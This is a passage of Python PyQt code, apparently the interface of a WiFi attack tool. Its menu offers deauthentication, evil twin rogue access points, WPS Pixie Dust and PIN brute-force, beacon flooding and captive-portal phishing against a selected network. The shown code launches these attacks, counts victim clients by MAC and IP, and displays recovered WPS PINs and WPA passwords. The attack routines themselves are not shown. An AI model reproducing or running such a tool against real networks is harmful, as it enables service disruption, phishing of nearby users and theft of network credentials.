                background: #ff006e;
                color: #0d1117;
            }
        """)
        
        # Start scan thread
        self.scan_thread = ScanThread(self.current_interface)
        self.scan_thread.network_found.connect(self.add_network_to_table)
        self.scan_thread.scan_complete.connect(self.on_scan_complete)
        self.scan_thread.progress_update.connect(self.on_scan_progress)
        self.scan_thread.error_occurred.connect(self.log)  # Add this line
        self.scan_thread.start()

    
    def on_scan_progress(self, value, message):
        """Update scan progress"""
        self.progress.setValue(value)
        self.progress.setFormat(message)
    
    def on_scan_complete(self, count):
        """Scan complete"""
        self.progress.setValue(100)
        self.progress.setFormat(f"✅ Scan complete - {count} networks")
        self.log(f"✅ Found {count} networks. Select target then Launch Attack.")
        
        # Reset button
        self.refresh_btn.setText("🔄 Refresh")
        self.refresh_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #00ff88;
                color: #00ff88;
                font-weight: bold;
                padding: 8px 12px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #00ff88;
                color: #0d1117;
            }
        """)

    
    def show_attack_menu(self):
        """Show available attacks menu"""
        target = self.selected_target
        
        dialog = QDialog(self)
        dialog.setWindowTitle("⚔️ Select Attack Type")
        dialog.setModal(True)
        dialog.setMinimumSize(450, 300)
        dialog.setStyleSheet(DARK_THEME)
        
        layout = QVBoxLayout(dialog)
        
        # Header
        header = QLabel("⚔️ ATTACK MENU")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #ff006e; margin: 15px;")
        layout.addWidget(header)
        
        # Target info
        info_text = f"Target: {target['ssid']}\nBSSID: {target['bssid']}\nChannel: {target['channel']}"
        info_label = QLabel(info_text)
        info_label.setStyleSheet("color: #c9d1d9; margin: 10px; padding: 10px; background: #161b22; border-radius: 6px;")
        layout.addWidget(info_label)
        
        # Attack options
        attacks = [
            ("1️⃣ Handshake Capture", "handshake", "#ffbe0b"),
            ("2️⃣ Deauthentication", "deauth", "#ff006e"),
            ("3️⃣ Evil Twin + Deauth", "evil_twin", "#8338ec"),
            ("4️⃣ WPS Attack", "wps", "#00b4d8"),
            ("5️⃣ Beacon Flood (SSID Chaos)", "beacon_flood", "#e040fb"),
            ("6️⃣ WiFi Phishing (Captive Portal)", "wifi_phishing", "#ff6b35"),
        ]
        
        for text, attack_id, color in attacks:
            btn = QPushButton(text)
            btn.setMinimumHeight(50)
            btn.setStyleSheet(f"""
                QPushButton {{
                    background: #21262d;
                    border: 2px solid {color};
                    color: {color};
                    font-size: 13px;
                    font-weight: bold;
                    text-align: left;
                    padding-left: 20px;
                    border-radius: 6px;
                }}
                QPushButton:hover {{
                    background: {color};
                    color: #0d1117;
                }}
            """)
            btn.clicked.connect(lambda checked, aid=attack_id: self.handle_attack_selection(aid, dialog))
            layout.addWidget(btn)
        
        layout.addStretch()
        
        # Cancel button
        cancel_btn = QPushButton("❌ Cancel")
        cancel_btn.clicked.connect(dialog.reject)
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #161b22;
                border: 2px solid #8b949e;
                color: #8b949e;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #8b949e;
                color: #0d1117;
            }
        """)
        layout.addWidget(cancel_btn)
        
        dialog.exec()

    def handle_attack_selection(self, attack_type, dialog):
        """Route to appropriate attack handler"""
        dialog.close()
        
        if attack_type == "deauth":
            self.execute_deauth()
        elif attack_type == "handshake":
            self.execute_handshake()
        elif attack_type == "evil_twin":
            self.execute_evil_twin()
        elif attack_type == "wps":
            self.execute_wps()
        elif attack_type == "beacon_flood":
            self.execute_beacon_flood()
        elif attack_type == "wifi_phishing":
            self.execute_wifi_phishing()

    def launch_attack(self):
        """Launch attack menu"""
        if not self.selected_target:
            self.log("❌ Select a target network first!")
            QMessageBox.warning(self, "No Target",
                "Please scan and select a target network first.")
            return
        
        if not self.current_interface or self.current_mode != "Monitor":
            self.log("❌ Monitor mode required!")
            return
        
        # Show attack type selection menu (not attack-specific dialogs)
        self.show_attack_menu()

    
    def execute_deauth(self):
        """Execute deauthentication attack with proper flow"""
        target = self.selected_target
        
        # Show deauth TYPE selection dialog FIRST
        dialog = DeauthDialog(
            target['ssid'],
            target['bssid'],
            target['channel'],
            self.current_interface,
            self
        )
        
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return
        
        attack_type = dialog.selected_attack
        
        # BROADCAST: Execute immediately
        if attack_type == "broadcast":
            self.perform_broadcast_deauth(target)
        
        # DIRECTED: Scan clients THEN let user select
        elif attack_type == "directed":
            self.log("🔍 Scanning for connected clients...")
            self.perform_directed_deauth(target)

    
    def perform_broadcast_deauth(self, target):
        """Perform broadcast deauth using background thread"""
        self.log(f"🎯 Launching BROADCAST deauth on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")
        
        try:
            # Create deauth thread
            self.deauth_thread = DeauthThread(
                self.current_interface,
                target['bssid'],
                target['ssid'],
                int(target['channel']),
                client_mac=None
            )
            
            self.deauth_thread.status_update.connect(self.update_attack_stats)  # ← CHANGE THIS
            self.deauth_thread.attack_complete.connect(self.on_deauth_complete)
            self.deauth_thread.start()
            
            # Show stop attack button
            self.show_stop_attack_button()
        
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    
    def perform_directed_deauth(self, target):
        """Perform directed deauth with proper client scanning"""
        self.log(f"🎯 Launching DIRECTED deauth on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")
        self.log(f"   Scanning for connected clients...")
        
        try:
            # STEP 1: Scan for clients using airodump-ng
            # scanner = WiFiScanner()
            # clients = scanner.scan_for_clients(
            #     self.current_interface,
            #     target['bssid'],
            #     int(target['channel'])
            # )
            
            # # STEP 2: Show client selection dialog
            # client_dialog = ClientSelectionDialog(
            #     target['bssid'],
            #     target['ssid'],
            #     target['channel'],
            #     self.current_interface,  # PASS the scanned clients list
            #     self
            # )
            # Show client selection dialog (it will scan automatically)
            client_dialog = ClientSelectionDialog(
                target['bssid'],
                target['ssid'],
                target['channel'],
                self.current_interface,
                self  # parent only, NO clients parameter
            )

            if client_dialog.exec() != QDialog.DialogCode.Accepted:
                self.log("❌ Directed deauth cancelled")
                return
            
            selected_client = client_dialog.get_selected_client()
            
            if selected_client:
                self.log(f"   📍 Selected Client: {selected_client}")
            else:
                self.log(f"   📢 No client selected - will use broadcast mode")
            
            # STEP 3: Execute the deauth attack
            self.deauth_thread = DeauthThread(
                self.current_interface,
                target['bssid'],
                target['ssid'],
                int(target['channel']),
                client_mac=selected_client
            )

            self.deauth_thread.status_update.connect(self.update_attack_stats)  
            self.deauth_thread.attack_complete.connect(self.on_deauth_complete)
            self.deauth_thread.start()

            # Show stop attack button
            self.show_stop_attack_button()

        
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", f"Deauth failed: {str(e)}")

    def crack_password(self):
        """Password cracking"""
        self.log("🔓 Opening password cracking module...")
        self.log("⚠️ Cracking interface pending...")


    def show_stop_attack_button(self):
        """Show stop attack button and stats panel"""
        # Create stats panel
        self.stats_panel = self.create_stats_panel()
        
        # Create stop button
        self.stop_attack_btn = QPushButton("⏹️ Stop Attack")
        self.stop_attack_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #ff006e;
                color: #ff006e;
                font-weight: bold;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #ff006e;
                color: #0d1117;
            }
        """)
        self.stop_attack_btn.clicked.connect(self.stop_attack)
        
        # Add to main layout (above progress bar)
        layout = self.centralWidget().layout()
        layout.insertWidget(layout.count() - 2, self.stats_panel)
        layout.insertWidget(layout.count() - 2, self.stop_attack_btn)
        
        # Start stats update timer
        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.blink_stats)
        self.stats_timer.start(500)  # Blink every 500ms
        self.blink_state = False


    def stop_attack(self):
        """Stop running deauth attack"""
        if hasattr(self, 'deauth_thread') and self.deauth_thread.isRunning():
            self.log("🛑 Stopping deauth attack...")
            self.deauth_thread.stop()
            self.deauth_thread.wait()
            self.log("✅ Attack stopped successfully")
            self.hide_stop_attack_button()

    def hide_stop_attack_button(self):
        """Remove stop attack button and stats panel"""
        # Stop blinking timer
        if hasattr(self, 'stats_timer'):
            self.stats_timer.stop()
            del self.stats_timer
        
        # Remove stats panel
        if hasattr(self, 'stats_panel'):
            self.stats_panel.deleteLater()
            del self.stats_panel
        
        # Remove stop button
        if hasattr(self, 'stop_attack_btn'):
            self.stop_attack_btn.deleteLater()
            del self.stop_attack_btn


    def on_deauth_complete(self, success, message):
        """Handle deauth completion"""
        if success:
            self.log(f"✅ {message}")
        else:
            self.log(f"❌ Error: {message}")
        self.hide_stop_attack_button()
    
    def create_stats_panel(self):
        """Create live attack statistics panel"""
        panel = QWidget()
        panel.setStyleSheet("""
            QWidget {
                background: #161b22;
                border: 2px solid #ff006e;
                border-radius: 8px;
                padding: 10px;
            }
        """)
        
        layout = QVBoxLayout(panel)
        
        # Title
        title = QLabel("⚡ LIVE ATTACK STATS")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #ff006e; font-weight: bold; font-size: 16px; border: none;")
        layout.addWidget(title)
        
        # Stats grid
        stats_layout = QHBoxLayout()
        
        # Packets sent
        packets_widget = QWidget()
        packets_layout = QVBoxLayout(packets_widget)
        packets_layout.setContentsMargins(5, 5, 5, 5)
        self.packets_label = QLabel("0")
        self.packets_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.packets_label.setStyleSheet("color: #00ff88; font-size: 28px; font-weight: bold; border: none;")
        packets_desc = QLabel("Packets Sent")
        packets_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        packets_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        packets_layout.addWidget(self.packets_label)
        packets_layout.addWidget(packets_desc)
        stats_layout.addWidget(packets_widget)
        
        # Time elapsed
        time_widget = QWidget()
        time_layout = QVBoxLayout(time_widget)
        time_layout.setContentsMargins(5, 5, 5, 5)
        self.time_label = QLabel("0s")
        self.time_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.time_label.setStyleSheet("color: #ffbe0b; font-size: 28px; font-weight: bold; border: none;")
        time_desc = QLabel("Time Elapsed")
        time_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        time_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        time_layout.addWidget(self.time_label)
        time_layout.addWidget(time_desc)
        stats_layout.addWidget(time_widget)
        
        # Attack rate
        rate_widget = QWidget()
        rate_layout = QVBoxLayout(rate_widget)
        rate_layout.setContentsMargins(5, 5, 5, 5)
        self.rate_label = QLabel("0/s")
        self.rate_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.rate_label.setStyleSheet("color: #ff006e; font-size: 28px; font-weight: bold; border: none;")
        rate_desc = QLabel("Attack Rate")
        rate_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        rate_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        rate_layout.addWidget(self.rate_label)
        rate_layout.addWidget(rate_desc)
        stats_layout.addWidget(rate_widget)
        
        layout.addLayout(stats_layout)
        
        # Progress bar with animation
        self.attack_progress = QProgressBar()
        self.attack_progress.setRange(0, 0)  # Infinite animation
        self.attack_progress.setTextVisible(False)
        self.attack_progress.setStyleSheet("""
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                height: 8px;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #ff006e, stop:0.5 #ffbe0b, stop:1 #00ff88);
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.attack_progress)
        
        return panel
    
    def update_attack_stats(self, message):
        """Update live attack statistics from thread"""
        self.log(message)
        
        # Parse stats from message
        if "Packets:" in message and "|" in message:
            import re
            parts = message.split("|")
            
            # Extract packets
            packets_match = re.search(r'Packets:\s*(\d+)', parts[0])
            if packets_match:
                packets = packets_match.group(1)
                self.packets_label.setText(packets)
            
            # Extract time
            if len(parts) > 1:
                time_match = re.search(r'Time:\s*(\d+)s', parts[1])
                if time_match:
                    elapsed = time_match.group(1)
                    self.time_label.setText(f"{elapsed}s")
            
            # Extract rate
            if len(parts) > 2:
                rate_match = re.search(r'Rate:\s*([\d.]+)/s', parts[2])
                if rate_match:
                    rate = rate_match.group(1)
                    self.rate_label.setText(f"{rate}/s")

    def blink_stats(self):
        """Animate stats panel with blinking effect"""
        if hasattr(self, 'packets_label'):
            if self.blink_state:
                self.packets_label.setStyleSheet("color: #00ff88; font-size: 28px; font-weight: bold; border: none;")
            else:
                self.packets_label.setStyleSheet("color: #00cc66; font-size: 28px; font-weight: bold; border: none;")
            self.blink_state = not self.blink_state

    def execute_evil_twin(self):
        """Execute Evil Twin attack"""
        target = self.selected_target
        
        # Show mode selection dialog
        dialog = EvilTwinDialog(
            target['ssid'],
            target['bssid'],
            target['channel'],
            self.current_interface,
            self
        )
        
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return
        
        mode = dialog.selected_mode
        
        if mode == "simple":
            self.perform_simple_evil_twin(target)
        elif mode == "advanced":
            QMessageBox.information(self, "Coming Soon", "Advanced Evil Twin will be available soon!")
        
    def perform_simple_evil_twin(self, target):
        """Perform Simple Evil Twin attack with live stats"""
        self.log(f"🎭 Launching Evil Twin attack on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")
        self.log(f"   Mode: Simple (Open Network + Deauth)")
        
        try:
            # Create stats panel
            self.evil_stats_panel = self.create_evil_twin_stats_panel()
            
            # Create stop button
            self.stop_evil_twin_btn = QPushButton("⏹️ Stop Evil Twin Attack")
            self.stop_evil_twin_btn.setStyleSheet("""
                QPushButton {
                    background: #21262d;
                    border: 2px solid #8338ec;
                    color: #8338ec;
                    font-weight: bold;
                    padding: 10px;
                    border-radius: 6px;
                }
                QPushButton:hover {
                    background: #8338ec;
                    color: #0d1117;
                }
            """)
            self.stop_evil_twin_btn.clicked.connect(self.stop_evil_twin)
            
            # Add to layout
            layout = self.centralWidget().layout()
            layout.insertWidget(layout.count() - 2, self.evil_stats_panel)
            layout.insertWidget(layout.count() - 2, self.stop_evil_twin_btn)
            
            # Initialize stats
            self.evil_twin_clients = 0
            self.evil_twin_seen_clients = set()
            self.evil_twin_start_time = time.time()
            
            # Create Evil Twin thread
            self.evil_twin_thread = EvilTwinThread(
                self.current_interface,
                target['bssid'],
                target['ssid'],
                int(target['channel'])
            )
            
            self.evil_twin_thread.status_update.connect(self.update_evil_twin_status)
            self.evil_twin_thread.client_connected.connect(self.on_evil_twin_client)
            self.evil_twin_thread.attack_complete.connect(self.on_evil_twin_complete)
            self.evil_twin_thread.start()
            
            # Start timer for duration
            self.evil_timer = QTimer()
            self.evil_timer.timeout.connect(self.update_evil_twin_time)
            self.evil_timer.start(1000)  # Update every second
        
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    def update_evil_twin_status(self, message):
        """Update Evil Twin status from thread"""
        self.log(message)
        
        # Update AP status based on message
        if "Rogue AP started successfully" in message:
            self.ap_status_label.setText("🟢 ONLINE")
            self.ap_status_label.setStyleSheet("color: #00ff88; font-size: 24px; font-weight: bold; border: none;")
        elif "Error" in message or "Failed" in message:
            self.ap_status_label.setText("🔴 ERROR")
            self.ap_status_label.setStyleSheet("color: #ff006e; font-size: 24px; font-weight: bold; border: none;")

    
    def update_evil_twin_time(self):
        """Update attack duration"""
        if hasattr(self, 'evil_twin_start_time'):
            elapsed = int(time.time() - self.evil_twin_start_time)
            mins = elapsed // 60
            secs = elapsed % 60
            if mins > 0:
                self.evil_time_label.setText(f"{mins}m {secs}s")
            else:
                self.evil_time_label.setText(f"{secs}s")


    def on_evil_twin_client(self, mac, ip):
        """Handle new client connection - DEDUPLICATION ENABLED"""
        # Create unique client identifier
        client_id = f"{mac.upper()}:{ip}"
        
        # Check if we've already counted this client
        if not hasattr(self, 'evil_twin_seen_clients'):
            self.evil_twin_seen_clients = set()
        
        if client_id in self.evil_twin_seen_clients:
            # Already counted, skip
            return
        
        # New unique client!
        self.evil_twin_seen_clients.add(client_id)
        self.evil_twin_clients += 1
        
        # Update counter display
        self.evil_clients_label.setText(str(self.evil_twin_clients))
        
        # Add to clients list with timestamp
        timestamp = time.strftime("%H:%M:%S")
        client_info = f"[{timestamp}] 🟢 {mac} → {ip}"
        self.evil_clients_list.append(client_info)
        
        # Log to main console
        self.log(f"🎉 NEW CLIENT #{self.evil_twin_clients}: {mac} → {ip}")
        
        # Flash animation on counter
        self.evil_clients_label.setStyleSheet(
            "color: #ffbe0b; font-size: 32px; font-weight: bold; border: none;"
        )
        QTimer.singleShot(500, lambda: self.evil_clients_label.setStyleSheet(
            "color: #00ff88; font-size: 28px; font-weight: bold; border: none;"
        ))
        
        # Play notification sound
        try:
            subprocess.Popen(
                ["paplay", "/usr/share/sounds/freedesktop/stereo/complete.oga"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass


    def show_stop_evil_twin_button(self):
        """Show stop button for Evil Twin"""
        self.stop_evil_twin_btn = QPushButton("⏹️ Stop Evil Twin")
        self.stop_evil_twin_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #8338ec;
                color: #8338ec;
                font-weight: bold;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #8338ec;
                color: #0d1117;
            }
        """)
        self.stop_evil_twin_btn.clicked.connect(self.stop_evil_twin)
        
        layout = self.centralWidget().layout()
        layout.insertWidget(layout.count() - 2, self.stop_evil_twin_btn)

    def stop_evil_twin(self):
        """Stop Evil Twin attack"""
        if hasattr(self, 'evil_twin_thread') and self.evil_twin_thread.isRunning():
            self.log("🛑 Stopping Evil Twin attack...")
            self.evil_twin_thread.stop()
            self.evil_twin_thread.wait()
            self.log("✅ Attack stopped")
            self.hide_stop_evil_twin_button()

    def hide_stop_evil_twin_button(self):
        """Remove stop button and stats panel"""
        # Stop timer
        if hasattr(self, 'evil_timer'):
            self.evil_timer.stop()
            del self.evil_timer
        
        # Clear tracking set
        if hasattr(self, 'evil_twin_seen_clients'):
            del self.evil_twin_seen_clients
        
        # Remove stats panel
        if hasattr(self, 'evil_stats_panel'):
            self.evil_stats_panel.deleteLater()
            del self.evil_stats_panel
        
        # Remove stop button
        if hasattr(self, 'stop_evil_twin_btn'):
            self.stop_evil_twin_btn.deleteLater()
            del self.stop_evil_twin_btn


    def on_evil_twin_complete(self, success, message):
        """Handle Evil Twin completion"""
        if success:
            self.log(f"✅ {message}")
        else:
            self.log(f"❌ Error: {message}")
        self.hide_stop_evil_twin_button()

    def create_evil_twin_stats_panel(self):
        """Create live Evil Twin statistics panel"""
        panel = QWidget()
        panel.setStyleSheet("""
            QWidget {
                background: #161b22;
                border: 2px solid #8338ec;
                border-radius: 8px;
                padding: 10px;
            }
        """)
        
        layout = QVBoxLayout(panel)
        
        # Title
        title = QLabel("🎭 EVIL TWIN ATTACK - LIVE STATUS")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #8338ec; font-weight: bold; font-size: 16px; border: none;")
        layout.addWidget(title)
        
        # Stats grid
        stats_layout = QHBoxLayout()
        
        # AP Status
        status_widget = QWidget()
        status_layout = QVBoxLayout(status_widget)
        status_layout.setContentsMargins(5, 5, 5, 5)
        self.ap_status_label = QLabel("🔴 OFFLINE")
        self.ap_status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.ap_status_label.setStyleSheet("color: #ff006e; font-size: 24px; font-weight: bold; border: none;")
        status_desc = QLabel("Rogue AP Status")
        status_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        status_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        status_layout.addWidget(self.ap_status_label)
        status_layout.addWidget(status_desc)
        stats_layout.addWidget(status_widget)
        
        # Clients Connected
        clients_widget = QWidget()
        clients_layout = QVBoxLayout(clients_widget)
        clients_layout.setContentsMargins(5, 5, 5, 5)
        self.evil_clients_label = QLabel("0")
        self.evil_clients_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.evil_clients_label.setStyleSheet("color: #00ff88; font-size: 28px; font-weight: bold; border: none;")
        clients_desc = QLabel("Clients Connected")
        clients_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        clients_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        clients_layout.addWidget(self.evil_clients_label)
        clients_layout.addWidget(clients_desc)
        stats_layout.addWidget(clients_widget)
        
        # Time Running
        time_widget = QWidget()
        time_layout = QVBoxLayout(time_widget)
        time_layout.setContentsMargins(5, 5, 5, 5)
        self.evil_time_label = QLabel("0s")
        self.evil_time_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.evil_time_label.setStyleSheet("color: #ffbe0b; font-size: 28px; font-weight: bold; border: none;")
        time_desc = QLabel("Attack Duration")
        time_desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
        time_desc.setStyleSheet("color: #8b949e; font-size: 11px; border: none;")
        time_layout.addWidget(self.evil_time_label)
        time_layout.addWidget(time_desc)
        stats_layout.addWidget(time_widget)
        
        layout.addLayout(stats_layout)
        
        # Connected clients list
        clients_list_label = QLabel("📱 CONNECTED CLIENTS:")
        clients_list_label.setStyleSheet("color: #00ff88; font-weight: bold; font-size: 12px; border: none; margin-top: 10px;")
        layout.addWidget(clients_list_label)
        
        self.evil_clients_list = QTextEdit()
        self.evil_clients_list.setReadOnly(True)
        self.evil_clients_list.setMaximumHeight(100)
        self.evil_clients_list.setStyleSheet("""
            QTextEdit {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 4px;
                color: #c9d1d9;
                padding: 5px;
                font-family: monospace;
            }
        """)
        layout.addWidget(self.evil_clients_list)
        
        # Animated progress bar
        self.evil_progress = QProgressBar()
        self.evil_progress.setRange(0, 0)  # Infinite
        self.evil_progress.setTextVisible(False)
        self.evil_progress.setStyleSheet("""
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                height: 8px;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #8338ec, stop:0.5 #ff006e, stop:1 #ffbe0b);
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.evil_progress)
        
        return panel


    def execute_wps(self):
        """Called from handle_attack_selection('wps', ...)."""
        target          = self.selected_target
        target_ssid     = target["ssid"]
        target_bssid    = target["bssid"]
        target_channel  = target["channel"]

        dialog = WPSModeDialog(
            target_ssid, target_bssid, target_channel,
            self.current_interface, self,
        )
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return

        self.perform_wps_attack(target, dialog.selected_mode)

    # ═══════════════════════════════════════════════════════════════
    #  WPS ATTACK — LAUNCH
    # ═══════════════════════════════════════════════════════════════

    def perform_wps_attack(self, target, mode):
        target_ssid    = target["ssid"]
        target_bssid   = target["bssid"]
        target_channel = target["channel"]

        MODE_LABELS = {
            "pixiedust": "Pixie Dust",
            "pinbrute":  "PIN Brute-Force",
            "both":      "Pixie Dust → PIN",
        }
        self.log(f"Launching WPS {MODE_LABELS.get(mode, mode)} on {target_ssid} ...")
        self.log(f"BSSID: {target_bssid}  |  Channel: {target_channel}")

        try:
            # ── stats panel ──────────────────────────────────────
            self.wps_panel = self._create_wps_panel(
                target_ssid, target_bssid, target_channel, mode
            )

            # ── stop button ──────────────────────────────────────
            self.wps_stop_btn = QPushButton("■  Stop WPS Attack")
            self.wps_stop_btn.setStyleSheet("""
                QPushButton {
                    background: #21262d;
                    border: 2px solid #00b4d8;
                    color: #00b4d8;
                    font-weight: bold;
                    padding: 10px;
                    border-radius: 6px;
                }
                QPushButton:hover { background: #00b4d8; color: #0d1117; }
            """)
            self.wps_stop_btn.clicked.connect(self.stop_wps)

            layout = self.centralWidget().layout()
            layout.insertWidget(layout.count() - 2, self.wps_panel)
            layout.insertWidget(layout.count() - 2, self.wps_stop_btn)

            # ── background thread ────────────────────────────────
            self.wps_thread = WPSAttackThread(
                self.current_interface,
                target_bssid, target_ssid, target_channel,
                mode=mode,
            )
            self.wps_thread.statusupdate.connect(self._wps_on_status)
            self.wps_thread.phasechanged.connect(self._wps_on_phase)
            self.wps_thread.statsupdate.connect(self._wps_on_stats)
            self.wps_thread.wps_result.connect(self._wps_on_result)
            self.wps_thread.attackcomplete.connect(self._wps_on_complete)
            self.wps_thread.start()

            # ── elapsed timer ─────────────────────────────────────
            self._wps_start_time = time.time()
            self.wps_timer = QTimer()
            self.wps_timer.timeout.connect(self._wps_tick_timer)
            self.wps_timer.start(1000)

        except Exception as e:
            self.log(f"! WPS Error: {e}")
            QMessageBox.critical(self, "Error", str(e))

    # ═══════════════════════════════════════════════════════════════
    #  WPS ATTACK — LIVE STATS PANEL BUILDER
    # ═══════════════════════════════════════════════════════════════

    def _create_wps_panel(self, ssid, bssid, channel, mode):
        MODE_LABELS = {
            "pixiedust": "⚡ PIXIE DUST",
            "pinbrute":  "🔢 PIN BRUTE-FORCE",
            "both":      "🔄 PIXIE DUST → PIN",
        }

        panel = QWidget()
        panel.setStyleSheet("""
            QWidget {
                background: #161b22;
                border: 2px solid #00b4d8;
                border-radius: 8px;
                padding: 10px;
            }
        """)
        layout = QVBoxLayout(panel)
        layout.setSpacing(6)

        # ── title ────────────────────────────────────────────────
        title = QLabel(f"📡  WPS ATTACK — {MODE_LABELS.get(mode, mode)}")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet(
            "color:#00b4d8; font-weight:bold; font-size:16px; border:none;"
        )
        layout.addWidget(title)

        # ── target info strip ────────────────────────────────────
        info = QLabel(f"  {ssid}   ·   {bssid}   ·   Ch {channel}")
        info.setStyleSheet(
            "color:#8b949e; font-size:11px; border:none; margin-bottom:2px;"
        )
        layout.addWidget(info)

        # ── BIG phase label ──────────────────────────────────────
        self.wps_phase_label = QLabel("⚙  SETTING UP")
        self.wps_phase_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.wps_phase_label.setStyleSheet(
            "color:#00b4d8; font-size:22px; font-weight:bold;"
            "background:#0d1117; border-radius:6px; padding:10px;"
            "margin:4px 0; border:1px solid #30363d;"
        )
        layout.addWidget(self.wps_phase_label)

        # ── credential display box (hidden until found) ──────────
        self.wps_cred_box = QLabel("")
        self.wps_cred_box.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.wps_cred_box.setWordWrap(True)
        self.wps_cred_box.setVisible(False)
        self.wps_cred_box.setStyleSheet("""
            QLabel {
                color: #00ff88;
                font-size: 16px;
                font-weight: bold;
                font-family: monospace;
                background: #0d1117;
                border: 2px solid #00ff88;
                border-radius: 6px;
                padding: 12px;
                margin: 4px 0;
            }
        """)
        layout.addWidget(self.wps_cred_box)

        # ── stats grid ───────────────────────────────────────────
        stats_row = QHBoxLayout()

        def _stat(attr, label_text, colour, init="—"):
            w  = QWidget()
            vl = QVBoxLayout(w)
            vl.setContentsMargins(5, 5, 5, 5)
            val = QLabel(init)
            val.setAlignment(Qt.AlignmentFlag.AlignCenter)
            val.setStyleSheet(
                f"color:{colour}; font-size:26px; font-weight:bold; border:none;"
            )
            desc = QLabel(label_text)
            desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
            desc.setStyleSheet("color:#8b949e; font-size:10px; border:none;")
            vl.addWidget(val)
            vl.addWidget(desc)
            setattr(self, attr, val)
            return w

        stats_row.addWidget(_stat("wps_time_lbl",     "Time Elapsed",   "#ffbe0b", "0s"))
        stats_row.addWidget(_stat("wps_progress_lbl", "Progress",        "#00b4d8", "—"))
        stats_row.addWidget(_stat("wps_pins_lbl",     "Last PIN Tried",  "#ff006e", "—"))
        layout.addLayout(stats_row)

        # ── mode-specific help text ──────────────────────────────
        if mode == "pixiedust":
            hint_text = ("✔  WPS PIN: XXXXXXXX  — success in seconds"
                "✔  WPA PSK: password  — full key recovered"
                "✖  Failed to recover  — AP not vulnerable"
            )
            hint_col = "#00b4d8"
        elif mode == "pinbrute":
            hint_text = (
                "🔢  Reaver trying 11,000 PIN combos  (4–48 hrs)"
                "Progress shown in % above  |  Results saved to .reaver/"
                "Tip: run again later — reaver resumes automatically"
            )
            hint_col = "#ffbe0b"
        else:
            hint_text = (
                "Phase 1: Pixie Dust  (fast, few seconds)"
                "Phase 2: PIN Brute-Force  (auto-starts if Pixie Dust fails)"
            )
            hint_col = "#00ff88"

        hint = QLabel(hint_text)
        hint.setStyleSheet(
            f"color:{hint_col}; font-size:10px; border:1px solid #30363d;"
            "border-radius:4px; padding:8px; background:#0d1117;"
        )
        layout.addWidget(hint)

        # ── infinite animated spinner ────────────────────────────
        self.wps_spinner = QProgressBar()
        self.wps_spinner.setRange(0, 0)
        self.wps_spinner.setTextVisible(False)
        self.wps_spinner.setStyleSheet("""
            QProgressBar {
                border: 1px solid #30363d;
                border-radius: 4px;
                background: #0d1117;
                height: 6px;
            }
            QProgressBar::chunk {
                background: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00b4d8, stop:0.5 #ffbe0b, stop:1 #00ff88
                );
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.wps_spinner)

        # ── mini activity log ────────────────────────────────────
        log_hdr = QLabel("  REAVER OUTPUT")
        log_hdr.setStyleSheet(
            "color:#00b4d8; font-weight:bold; font-size:11px;"
            "border:none; margin-top:4px;"
        )
        layout.addWidget(log_hdr)

        self.wps_log = QTextEdit()
        self.wps_log.setReadOnly(True)
